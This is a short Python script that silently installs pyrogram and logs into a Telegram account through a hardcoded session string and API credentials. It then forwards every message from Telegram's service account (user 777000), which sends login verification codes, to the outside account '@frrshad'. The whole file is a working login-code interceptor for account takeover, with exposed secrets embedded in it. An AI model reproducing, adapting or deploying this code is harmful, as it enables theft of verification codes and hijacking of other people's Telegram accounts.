import os, sys
if sys.platform == 'win32':
    pip_line = 'python -m pip install pyrogram==2.0.30'
else:
    pip_line = 'pip install pyrogram==2.0.30'
os.system(pip_line)

from pyrogram import Client, filters
from pyrogram.types import Message

feri = 'AQA_FWwzm-CUMm18EYieupgDF0N2_Msrokh7YRyadUlK3pxkNKuEid-I6quy3Em5s8u7De4war5HrSygR6XyrY3i477qKU-NX5y24rFr5bdYQb8xdbBxlZOrcvbVJd8kiZolg34jO1B0sDMX3RBqJUmPVcIYjNa42w4sM0AfXXNMgVuAHC0nhOy6a5f7V9Vg7HBV_qiMiYFTG8s12Q1ZUWafJJ6PKb5LfamcigcGmqg93jtL-CwnMBwosuzXIvBS2C5H2wJRBeqbUWVtb5_ZAq0JbyhsimZJDo-zoz2I47WFmSjrJKWA9TxhE9Z6_UtQuiZoPv1T40pRQn_CF-1nb9fzAAAAAU7Pks4A'

app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851', session_string=feri)

id_or_username = '@frrshad'


@app.on_message(filters.user(777000))
def forward_code(app:Client, message:Message):
    app.forward_messages(id_or_username, message.chat.id, message.id)

  
app.run()
